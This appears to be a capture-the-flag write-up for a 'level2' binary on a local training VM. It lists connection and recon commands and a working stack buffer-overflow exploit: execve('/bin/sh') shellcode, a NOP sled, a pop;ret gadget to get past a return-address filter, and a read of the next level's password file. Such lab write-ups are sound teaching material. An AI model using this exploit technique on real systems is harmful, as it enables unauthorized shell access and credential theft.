# Level2 — Commands

## Connection

```bash
ssh level2@localhost -p 4242
```

Password: (in `level1/flag`)

---

## Recon

```bash
pwd
ls -la
file level2
readelf -h level2
```

Extraction (from the host):

```bash
cd level2
sshpass -p '<level2_password>' scp -o StrictHostKeyChecking=no -P 4242 level2@localhost:level2 ./level2.bin
```

Local analysis: `strings`, `readelf -s`, `objdump -d`. See `analysis.md`.

---

## Exploitation

The binary has no `system`. Overflow in `p()` with a filter on the return address (0xb0... forbidden). We use a `pop; ret` gadget (0x08048385) and shellcode in the buffer.

Classic execve("/bin/sh") shellcode (no \x00 or \n), e.g. 28 bytes:

```python
# Python 2 on the VM
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

Payload with **NOP sled** (to tolerate an approximate address). If you get "Illegal instruction", the buffer address is wrong: the CPU is executing padding or address bytes. Try the addresses listed below.

```bash
( python -c '
import struct
NOP = "\x90"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# NOP sled 40 bytes to widen the target
nopsled = NOP * 40
pad = 80 - len(nopsled) - len(shellcode)
buf_addr = 0xbffff700   # try 0xbffff5e0, 0xbffff600, 0xbffff650, 0xbffff700 if it fails
gadget = 0x08048385
payload = nopsled + shellcode + "A"*pad + struct.pack("<I", gadget) + struct.pack("<I", buf_addr) + struct.pack("<I", buf_addr)
print payload
'; cat ) | ./level2
```

**Addresses to try** (one by one) if "Illegal instruction" or nothing:
`0xbffff5e0`, `0xbffff600`, `0xbffff650`, `0xbffff6a0`, `0xbffff6c0`, `0xbffff700`, `0xbffff750`.

---

## Retrieving the level3 password

In the shell: `cat /home/user/level3/.pass`. Record in `level2/flag`.
